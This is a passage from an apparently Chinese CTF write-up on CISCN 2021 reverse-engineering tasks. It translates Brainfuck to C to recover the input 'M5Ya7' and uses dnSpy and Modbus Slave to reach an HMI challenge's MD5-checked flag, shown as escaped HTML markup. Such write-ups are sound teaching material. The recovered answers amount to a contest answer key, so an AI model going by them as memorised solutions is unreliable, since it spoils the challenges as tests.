&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                cur&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;; 
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 
                &lt;span style=&#34;color:#75715e&#34;&gt;// fprintf(out, &amp;#34;\t\t--c;\n&amp;#34;); 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                cur&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;++a[%d];&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, cur); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;--a[%d];&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, cur); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;putchar(a[%d]);&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, cur); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a[%d] = getchar();&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, cur); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;while (a[%d]) {&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, cur); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; fprintf(out, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
    }

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始随便找了个脚本就运行，然后尝试去看，但后来发现很多指针位置的变化，看着很累，于是让指针的变化在内部运行，对具体数做变化的时候直接打印指针的值就可以了&lt;/p&gt;
&lt;h3 id=&#34;brainfuck-代码阅读&#34;&gt;Brainfuck 代码阅读&lt;/h3&gt;
&lt;p&gt;接下来就是痛苦的 Brainfuck 代码阅读环节了，虽然代码已经有了最简单的美化，但看起来还是像混淆过的汇编。&lt;/p&gt;
&lt;p&gt;自己做的时候是一点一点美化代码，然后阅读的。但最后找到验证函数才搞明白。&lt;/p&gt;
&lt;p&gt;所以先去最下面找到验证函数，看到最下面有两个&lt;code&gt;putchar&lt;/code&gt;，猜测就是通过验证了，于是找进入的条件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getchar();
        &lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
		&lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
	}
	    &lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
		&lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		putchar(a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]);
		&lt;span style=&#34;color:#75715e&#34;&gt;// several code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		putchar(a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]);
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入的条件是要 &lt;code&gt;a[2] &amp;gt; 0&lt;/code&gt;，网上看就知道需要让 &lt;code&gt;a[1] &amp;gt; 0&lt;/code&gt;，所以在编辑器里选中一下，就能找到所有 &lt;code&gt;a[1]&lt;/code&gt; 出现的地方（这就体现出这种输出方法的优势了）&lt;/p&gt;
&lt;p&gt;然后发现 &lt;code&gt;a[1]&lt;/code&gt; 会在一开始赋值为 &lt;code&gt;1&lt;/code&gt;，但一旦进入 &lt;code&gt;while(a[2])&lt;/code&gt; 这种大循环，就会出现 &lt;code&gt;a[1]=0&lt;/code&gt; 的赋值，所以我们的目标就是在进入循环前让 &lt;code&gt;a[2]==0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看一下从 &lt;code&gt;getchar&lt;/code&gt; 到 &lt;code&gt;while&lt;/code&gt; 之间的代码，把重复出现的 &lt;code&gt;++&lt;/code&gt; 都合并一下&lt;/p&gt;
&lt;p&gt;这里以第一次 &lt;code&gt;getchar&lt;/code&gt; 的代码为例，（剩下几次形式几乎完全一致，就是参数有点小变化而已）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getchar();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	}
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
	}
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;美化一下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getchar();
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
	} &lt;span style=&#34;color:#75715e&#34;&gt;// a[3] = a[4] * 11 = 77
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) {
        a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
	}
    	a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单地说就是会生成一个数字，然后用 &lt;code&gt;a[2]&lt;/code&gt; 去减，如果结果为 &lt;code&gt;0&lt;/code&gt;，就通过验证了，对所有的输入都搞一次，就能拿到五个输入字符 &lt;code&gt;M5Ya7&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;做这道题的时候，最大的问题就是没有搜索足够的资料，如果第一步想出来的话的，以比赛的时间，应该还是有机会做出来这道题的，毕竟后续的工作都是体力活，一点一点做下去应该就差不多能出来了&lt;/p&gt;
&lt;p&gt;不过不管怎么说，补题的过程还是学到了很多东西的，比如“病毒式”混淆可以直接用输出来解，brainfuck的小型解释器怎么看，以及最后直接输出索引地址，做题经验++&lt;/p&gt;
&lt;h2 id=&#34;hmi&#34;&gt;HMI&lt;/h2&gt;
&lt;p&gt;先说结论：屑题&lt;/p&gt;
&lt;p&gt;参考了这篇博客：https://myts2.cn/2021/05/16/ciscn2021/&lt;/p&gt;
&lt;h3 id=&#34;逆向分析&#34;&gt;逆向分析&lt;/h3&gt;
&lt;p&gt;用 file 命令看一眼，发现全是 .NET，直接上 dnSpy&lt;/p&gt;
&lt;p&gt;先搜索 &lt;code&gt;CISCN&lt;/code&gt; 字符串，找到最后的验证和输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;checked&lt;/span&gt;
{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (!&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.IsNullOrEmpty(AnalogValueDisplay.combined[num4]))
	{
		num4++;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (num4 &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)
		{
			IL_1B9:
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (num3 == &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
			{
				&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; hash = AnalogValueDisplay.GetHash(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.Join(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;, AnalogValueDisplay.combined));
				Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Booooooooooooooooom!&amp;#34;&lt;/span&gt;);
				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (Operators.CompareString(hash.Substring(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;F0B278CCB9&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) == &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
				{
							Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CISCN{&amp;#34;&lt;/span&gt; + hash + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;);
						}
					}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
		}
	}
	num3 = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_1B9;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以最后需要通过一个md5验证，然后往回找 &lt;code&gt;combined&lt;/code&gt; 是什么，发现是从 &lt;code&gt;text&lt;/code&gt; 赋值的&lt;/p&gt;
&lt;p&gt;而具体赋值到哪里，则是由 &lt;code&gt;num2&lt;/code&gt; 决定的， &lt;code&gt;num2&lt;/code&gt; 是一串 &lt;code&gt;41047&lt;/code&gt; - &lt;code&gt;41054&lt;/code&gt; 的字符串&lt;/p&gt;
&lt;p&gt;比赛的时候只知道这个是一个端口，但具体是什么没搞出来，疯狂往回找引用发现找不到东西，怀疑还是需要远程往里面打数据，因此尝试搭建GRFICS的平台（队内大佬找到的），最后熬不动放弃了&lt;/p&gt;
&lt;p&gt;参考别人的wp之后发现需要使用 Modbus Slave 往里面打数据，开始补题&lt;/p&gt;
&lt;h3 id=&#34;modbus-slave调试&#34;&gt;Modbus Slave调试&lt;/h3&gt;
&lt;p&gt;之前找到的 &lt;code&gt;401**&lt;/code&gt; 原来就是 Modbus 的端口，所以只需要用 Modbus Slave 往相应端口添加数据就行&lt;/p&gt;
&lt;p&gt;先直接运行找到粗略的范围（调试修改数据太慢了），目标就是让数字都变成白色&lt;/p&gt;
&lt;p&gt;在粗查的时候就能发现小数点后有一些位置在 exe 界面是看不到的&lt;/p&gt;
&lt;p&gt;明确范围后进 dnSpy 调试，总结出一个表格&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;min&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;max&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;dif&lt;/th&gt;
&lt;th&gt;combined&lt;/th&gt;
&lt;th&gt;i&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;$41046$&lt;/td&gt;
&lt;td&gt;$52.8016$&lt;/td&gt;
&lt;td&gt;$17312$&lt;/td&gt;
&lt;td&gt;$52.8992$&lt;/td&gt;
&lt;td&gt;$17344$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$2$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41047$&lt;/td&gt;
&lt;td&gt;$25.0002$&lt;/td&gt;
&lt;td&gt;$1634$&lt;/td&gt;
&lt;td&gt;$25.092$&lt;/td&gt;
&lt;td&gt;$1640$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$1$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41048$&lt;/td&gt;
&lt;td&gt;$62.10105$&lt;/td&gt;
&lt;td&gt;$20361$&lt;/td&gt;
&lt;td&gt;$62.19865$&lt;/td&gt;
&lt;td&gt;$20393$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$0$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41049$&lt;/td&gt;
&lt;td&gt;$406.6128$&lt;/td&gt;
&lt;td&gt;$26576$&lt;/td&gt;
&lt;td&gt;$406.6893$&lt;/td&gt;
&lt;td&gt;$26581$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$3$&lt;/td&gt;
&lt;/tr&gt;
